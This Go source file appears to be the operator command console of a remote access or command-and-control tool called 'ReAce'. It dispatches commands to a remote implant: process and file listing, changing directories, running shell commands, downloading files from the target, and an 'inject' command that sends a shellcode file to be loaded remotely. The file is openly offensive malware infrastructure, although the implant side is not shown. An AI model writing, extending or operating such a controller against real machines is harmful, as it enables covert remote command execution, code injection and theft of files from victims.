package CLI

import (
	"ReAce/CLI/Docs"
	"ReAce/CLI/Options"
	"ReAce/Package"
	"ReAce/Server"
	"ReAce/Task"
	"ReAce/Utils"
	"github.com/c-bata/go-prompt"
	"strings"
)

var MainUUID string

func controlExec(input string) {
	args := strings.Split(input, " ")
	if len(args) == 1 {
		switch input {
		case "proclist":
			{
				temp := Package.NewPackage(MainUUID, Package.PROC_GETLIST, nil)
				Server.Server.AddSendTask(*temp)
				return
			}
		case "?":
		case "help":
			{
				Docs.ControlDocs.PrintTable()
				return
			}
		case "ls":
			{
				temp := Package.NewPackage(MainUUID, Package.FS_GETFILES, "ls") //input[3:]
				Server.Server.AddSendTask(*temp)
				return
			}
		case "pwd":
			{
				temp := Package.NewPackage(MainUUID, Package.FS_CURRENT, "")
				Server.Server.AddSendTask(*temp)
				return

			}

		}
	}

	if len(args) > 1 {
		switch strings.ToLower(args[0]) {
		case "shell":
			{
				//fmt.Println(args[1])
				temp := Package.NewPackage(MainUUID, Package.SHELL_SENT, input[5:])
				Server.Server.AddSendTask(*temp)
				return
			}
		case "inject":
			{
				sc := Utils.ReadFileToByte(input[7:])
				//fmt.Println(sc[0])
				temp := Package.NewPackage(MainUUID, Package.SHELLCODE_LOAD, sc)
				Server.Server.AddSendTask(*temp)
				return
			}
		case "cd":
			{
				sc := input[3:]
				//	fmt.Println(sc)
				temp := Package.NewPackage(MainUUID, Package.FS_CD, sc)
				Server.Server.AddSendTask(*temp)
				return
			}
		case "down":
			{
				sc := args[1]
				Server.Server.Downloader = Task.DownLoader{
					FileName: sc,
				}
				temp := Package.NewPackage(MainUUID, Package.FS_DOWNLOAD, sc)
				Server.Server.AddSendTask(*temp)
				return
			}
		}
	}
}
func controlcompleter(d prompt.Document) []prompt.Suggest {

	//if d. {
	//	return MainOptionsSuggests
	//}
	//strings.Contains(d.GetWordBeforeCursor(), "remove ")
	//arg1 := strings.ToLower(strings.Split(d.TextBeforeCursor(), " ")[0])
	//if arg1 == "remove" || arg1 == "run" || arg1 == "stop" {
	//	return prompt.FilterHasPrefix(Utils.StringsToSuggests(Server.Server.GetListeners().GetListenersNames()), d.GetWordBeforeCursor(), true)
	//}

	return prompt.FilterHasPrefix(Options.ControlOptionsSuggests, d.TextBeforeCursor(), true)
}
